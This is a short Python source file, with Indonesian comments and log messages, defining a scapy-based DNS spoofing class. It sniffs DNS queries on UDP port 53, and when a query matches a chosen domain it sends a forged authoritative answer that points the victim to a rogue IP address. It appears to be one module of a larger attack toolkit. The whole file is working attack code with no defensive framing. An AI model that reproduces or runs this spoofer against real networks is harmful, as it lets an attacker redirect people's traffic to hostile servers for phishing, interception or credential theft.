import scapy.all as scapy
from utils.logger import logger

class DNSSpoofer:
    def __init__(self, target_domain, rogue_ip):
        self.target_domain = target_domain
        self.rogue_ip = rogue_ip

    def process_packet(self, packet):
        # Cek apakah paket memiliki layer DNS dan merupakan Query (qr=0)
        if packet.haslayer(scapy.DNS) and packet.getlayer(scapy.DNS).qr == 0:
            qname = packet[scapy.DNSQR].qname.decode("utf-8")
            
            # Cek apakah domain yang diminta sesuai dengan target kita
            if self.target_domain in qname:
                logger.info(f"[+] Mencegat DNS untuk '{qname}' -> Diarahkan ke {self.rogue_ip}")
                
                # Membuat jawaban DNS (Resource Record)
                answer = scapy.DNSRR(rrname=qname, rdata=self.rogue_ip)
                
                # Membangun paket balasan
                # Kita balikkan Source dan Destination dari paket asli
                spoofed_packet = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src) / \
                                 scapy.UDP(sport=packet[scapy.UDP].dport, dport=packet[scapy.UDP].sport) / \
                                 scapy.DNS(
                                     id=packet[scapy.DNS].id, 
                                     qr=1,      # Response
                                     aa=1,      # Authoritative Answer
                                     qd=packet[scapy.DNS].qd, 
                                     an=answer
                                 )
                
                # Kirim paket tanpa verbose agar log bersih
                scapy.send(spoofed_packet, verbose=False)

    def run(self):
        logger.info(f"Memulai DNS Spoofing... Menunggu permintaan untuk '{self.target_domain}'")
        # Filter hanya UDP port 53 (DNS)
        scapy.sniff(filter="udp port 53", prn=self.process_packet, store=False)